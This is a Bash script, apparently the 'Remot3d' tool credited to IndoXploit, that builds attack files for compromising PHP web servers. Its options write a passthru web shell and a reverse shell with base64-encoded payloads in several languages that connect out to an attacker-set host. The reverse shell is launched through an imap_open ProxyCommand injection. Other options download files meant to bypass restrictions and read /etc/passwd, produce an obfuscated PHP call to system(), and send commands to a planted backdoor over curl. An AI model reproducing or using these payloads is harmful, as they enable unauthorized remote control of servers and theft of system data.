#!/bin/bash   
##############################################################
#   Thank's to IndoXploit - ZeroByte.ID - Eldersc0de Family
#       Special Thanks : Ardhana Rezky and Bayu Fedra 
##############################################################
#
#                    COLORING YOUR SHELL
#
##############################################################
white="\033[1;37m"                                          ##
grey="\033[0;37m"                                           ##
purple="\033[0;35m"                                         ##
red="\033[1;31m"                                            ##
green="\033[1;32m"                                          ##
yellow="\033[1;33m"                                         ##
Purple="\033[0;35m"                                         ##
Cyan="\033[0;36m"                                           ##
Cafe="\033[0;33m"                                           ##
Fiuscha="\033[0;35m"                                        ##
blue="\033[1;34m"                                           ##
nc="\e[0m"                                                  ##
##############################################################
banner () {
    printf "${green}     

 _|                 _|_|_|${yellow}   >coded by b1p0l4r - IndoXploit<${green}        _|      _|_|_|          _|  
   _|               _|    _|    _|_|    _|_|_|  _|_|      _|_|    _|_|_|_|        _|    _|_|_|  
     _|             _|_|_|    _|_|_|_|  _|    _|    _|  _|    _|    _|        _|_|    _|    _|  
   _|               _|    _|  _|        _|    _|    _|  _|    _|    _|            _|  _|    _|  
 _|    _|_|_|_|_|   _|    _|    _|_|_|  _|    _|    _|    _|_|        _|_|  _|_|_|      _|_|_|  
                                                                                                                                                                                   \n"                                                                             
}
pwd=`pwd`
spinlong ()
{
    bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ "
    barlength=${#bar}
    i=0
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}
options () {
    echo""
    printf "      ${white}[${green}+${white}] Options :\n"
    printf "       └${white}[${red}-${white}] ${green}1.${white} Generate Backdoor\n";
    printf "       └${white}[${red}-${white}] ${green}2.${white} Generate Reverser Shell (with iMap Disable Function Bypass)\n";
    printf "       └${white}[${red}-${white}] ${green}3.${white} Bypass Read ${green}/etc/passwd ${white}(with unique logic)\n";
    printf "       └${white}[${red}-${white}] ${green}4.${white} Remote your Backdoor (Just for Option 1)\n";
}
main_remot3d_1 () {
    clear
    banner
    echo "";
    printf "      ${white}[${green}+${white}] Set Your Backdoor Name : "
    read out_name
    generate_file=$(echo "<?php echo passthru($_POST['idx'].' 2>&1'); ?>" > $out_name)
    printf "      ${white}[${green}+${white}] Success Generating Backdoor on ${green}$pwd/$out_name\n"
    echo "";

}


main_remot3d_2 () {
    clear
    banner
    echo "";
    printf "      ${white}[${green}+${white}] Set Your Backdoor Name : "
    read out_name
    ## IMAP_OPEN BYPASS REVERSE SHELL - BY : ARDZZ
    printf "      ${white}[${green}+${white}] Set HOST / IP : "
    read L_HOST
    printf "      ${white}[${green}+${white}] Set PORT : "
    read L_PORT
    printf "      ${white}[${green}+${white}] Set Exploit Language (${green}bash, perl, python, php, ruby, netcat, nc.${white}) : "
    read lang_rev
    cat << EOF > $out_name 
<?php
$config["ip"] = "$L_HOST";
$config["port"] = "$L_PORT";
$config["payload"] = [
	"bash" => "YmFzaCAtaSA+JiAvZGV2L3RjcC9bSVBdL1tQT1JUXSAwPiYx",
	"perl" => "cGVybCAtZSAndXNlIFNvY2tldDskaT0iW0lQXSI7JHA9W1BPUlRdO3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=",
	"python" => "cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiW0lQXSIsW1BPUlRdKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn",
	"php" => "cGhwIC1yICckc29jaz1mc29ja29wZW4oIltJUF0iLFtQT1JUXSk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn",
	"ruby" => "cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJbSVBdIixbUE9SVF0pLnRvX2k7ZXhlYyBzcHJpbnRmKCIvYmluL3NoIC1pIDwmJWQgPiYlZCAyPiYlZCIsZixmLGYpJw==",
	"netcat" => "bmMgLWUgL2Jpbi9zaCBbSVBdIFtQT1JUXQ==",
	"nc" => "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgW0lQXSBbUE9SVF0gPi90bXAvZg==",
];
$lang = "$lang_rev"; // PROGRAMMING LANGUAGE
$payload = str_replace([ "[IP]", "[PORT]" ], [ $config["ip"], $config["port"] ], base64_decode($config["payload"][$lang]));
echo "[{$lang}] => {$payload} ";
$server = "any -o ProxyCommand=echo\t".base64_encode($payload)."|base64\t-d|bash";
@imap_open('{'.$server.'}:143/imap}INBOX', '', '');
?>
EOF
    printf "      ${white}[${green}+${white}] Success Generating Backdoor on ${green}$pwd/$out_name\n"
    echo "";
}
main_remot3d_3 () {
    clear
    banner
        echo""
    printf "      ${white}[${green}+${white}] Options :\n"
    printf "       └${white}[${red}-${white}] ${green}1.${white} Unique Logic to Bypass /etc/passwd \n";
    printf "       └${white}[${red}-${white}] ${green}2.${white} Using cURL for Bypassing read /etc/passwd \n";
    printf "       └${white}[${red}-${white}] ${green}3.${white} Bypass disable system() function's\n";
    echo ""
    printf "      ┌[${green}+${white}] Choose the options\n";
printf "      └[root@indo${green}x${white}ploit]:~# ";
read optionz
    if [[ $optionz == "1" ]]; then
    clear
    banner
    printf "      ${white}[${green}+${white}] Set Your Backdoor File Name : "
    read etcpass_byp_file
    ## Bypass /etc/passwd - BY : ARDZZ
   dwnld_etcpass_byp1=$(curl --silent https://raw.githubusercontent.com/keepwannabe/Remot3d/master/bypasser-files/readfile-uniq.php -O $etcpass_byp_file)
   echo ""
    printf "      ${white}[${green}+${white}] Success ! Just Uploaded On Target And See What Happen :p \n"
        printf "      ${white}[${green}+${white}] File's Are Saved On${green} $pwd/$etcpass_byp_file \n"
elif [[ $optionz == "2" ]]; then
clear
banner
printf "      ${white}[${green}+${white}] Set Your Backdoor File Name : "
    read etcpass_byp_curl
    ## Bypass /etc/passwd - BY : ARDZZ
   dwnld_etcpass_byp2=$(curl --silent https://raw.githubusercontent.com/keepwannabe/Remot3d/master/bypasser-files/readfile-curl.php -O $etcpass_byp_curl)
   echo ""
    printf "      ${white}[${green}+${white}] Success ! Just Uploaded On Target And See What Happen :p \n"
        printf "      ${white}[${green}+${white}] File's Are Saved On${green} $pwd/$etcpass_byp_curl \n"
        elif [[ $optionz == "3" ]]; then
        clear
        banner
        option_about_etcpasswd
        else
        exit
        fi
}
        option_about_etcpasswd () {
      printf "      ${white}[${green}+${white}] Set Your Own Command (default is ${green}$u/b??/c?t $u/??c$u/p????d (for bypass /etc/passwd/)) (Y/n) ? : "
      read system_default
            printf "      ${white}[${green}+${white}] Set Your File Name : "
            read sys_name
      if [[ $system_default == "Y" ]]; then
printf "      ${white}[${green}+${white}] Set Command : "
read sys_cmd
cat << SYS > $sys_name
<?php
$a=("m".("s".("e")."t")."y");$b=$a[90/10-8]./**/($a[2*2-0/1]).$a[1*0+1/
1-0]./**/$a[150/50].($a[6/3*1/**/-0]).$a[/**/!FAlsE+fALsE-!fAlSe];$b('$sys_cmd');
?>
SYS
   echo ""
    printf "      ${white}[${green}+${white}] Success ! Just Uploaded On Target And See What Happen :p \n"
        printf "      ${white}[${green}+${white}] File's Are Saved On${green} $pwd/$sys_name \n"
elif [[ $system_default == "n" ]]; then
grab_sys_file=$(curl --silent https://raw.githubusercontent.com/keepwannabe/Remot3d/master/bypasser-files/command_system_bypass -o $sys_name)
   echo ""
    printf "      ${white}[${green}+${white}] Success ! Just Uploaded On Target And See What Happen :p \n"
        printf "      ${white}[${green}+${white}] File's Are Saved On${green} $pwd/$sys_name \n"
else
exit
fi
}
main_remot3d_4 () {
    clear
    banner
    echo "";
    printf "      ${white}[${green}+${white}] Shell Location's : "
    read shell_loc
    # check shell alive or not
    response=$(timeout 3 curl --write-out "%{http_code}\n" --silent --output /dev/null "$shell_loc")
    if [[ $response =~ "200" ]]; then
        spinlong
    sleep 2
    echo "";
    printf "      ${white}[${green}+${white}] ${green} Connected to Backdoor ${white}\n"
        while true
    do
    echo ""
    printf "      ${white}[${green}+${white}] COMMAND : "
    read cmd
    reverse=$(curl --silent -d idx="$cmd" "$shell_loc")
    printf "       └${white}[${blue}>${white}]"; for i in $reverse; do printf " $i\n           "; done
done
    else
        spinlong
    sleep 2
    printf "      ${white}[${red}-${white}] ${red} Disconnected from Backdoor ${white}\n"
    fi
}

chooser () {
    echo ""
    printf "      ┌[${green}+${white}] Choose the options\n";
printf "      └[root@indo${green}x${white}ploit]:~# ";
read options
if [[ $options == 1 ]]; then
main_remot3d_1
elif [[ $options == 2 ]]; then
main_remot3d_2
elif [[ $options == 3 ]]; then
main_remot3d_3
elif [[ $options == 4 ]]; then
main_remot3d_4
else
exit 1
fi
}
clear
printf '\e[8;22;96t'
spinlong
clear
banner
options
chooser
